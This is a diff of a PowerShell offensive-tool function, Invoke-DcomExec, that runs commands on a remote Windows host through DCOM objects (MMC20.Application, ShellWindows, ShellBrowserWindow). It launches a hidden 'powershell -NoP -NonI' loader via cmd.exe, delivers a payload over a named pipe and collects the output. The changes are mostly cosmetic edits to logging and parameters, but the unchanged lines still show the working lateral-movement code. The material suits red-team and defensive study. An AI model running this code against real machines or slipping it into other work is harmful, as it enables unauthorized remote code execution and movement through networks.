@@ -18,7 +18,7 @@ function Invoke-DcomExec {
     Specifies the execution method to use, defaults to MMC20.Application.
 
 .EXAMPLE
-    PS C:\> Invoke-PowerExec -ComputerName SRV.ADATUM.CORP -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -Method ShellWindows
+    PS C:\> Invoke-DcomExec -ComputerName SRV.ADATUM.CORP -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -Method ShellWindows
 #>
     [CmdletBinding()]
     Param (
@@ -30,7 +30,6 @@ function Invoke-DcomExec {
         [String]
         $ComputerName = $env:COMPUTERNAME,
 
-        [Parameter(Mandatory = $true, Position = 1)]
         [ValidateSet("MMC20.Application", "ShellWindows", "ShellBrowserWindow")]
         [String]
         $Method = "MMC20.Application"
@@ -64,7 +63,6 @@ function Invoke-DcomExec {
         $loader += '$z = [ScriptBlock]::Create($x); '
         $loader += '& $z'
         $arguments = '/c powershell -NoP -NonI -C "' + $loader + '"'
-        $command = '%COMSPEC%'
 
         # Build payload
         $script = ''
@@ -82,7 +80,7 @@ function Invoke-DcomExec {
     }
 
     Process {
-        Write-Verbose "Creating COM instance of $Method ($clsid)"
+        Write-Verbose "Creating COM instance of $Method ($clsid)..."
         try {
             $com = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
             $obj = [Activator]::CreateInstance($com)
@@ -92,7 +90,8 @@ function Invoke-DcomExec {
             break
         }
 
-        Write-Verbose "Running command: $command $arguments"
+        Write-Verbose "Running command remotely..."
+        Write-Debug "cmd.exe $arguments"
         switch ($Method) {
             'MMC20.Application' {
                 $obj.Document.ActiveView.ExecuteShellCommand('%COMSPEC%', $null, $arguments, '7')
@@ -106,12 +105,14 @@ function Invoke-DcomExec {
             }
         }
 
-        Write-Verbose "Connecting to named pipe server \\$ComputerName\pipe\$pipeName"
+        Write-Verbose "Connecting to named pipe server \\$ComputerName\pipe\$pipeName..."
         $pipeClient.Connect($pipeTimeout)
-        $writer = New-Object  IO.StreamWriter($pipeClient)
+        Write-Verbose "Delivering payload..."
+        $writer = New-Object IO.StreamWriter($pipeClient)
         $writer.AutoFlush = $true
         $writer.WriteLine($payload)
-        $reader = new-object IO.StreamReader($pipeClient)
+        Write-Verbose "Getting execution output..."
+        $reader = New-Object IO.StreamReader($pipeClient)
         $output = ''
         while (($data = $reader.ReadLine()) -ne $null) {
             $output += $data + [Environment]::NewLine
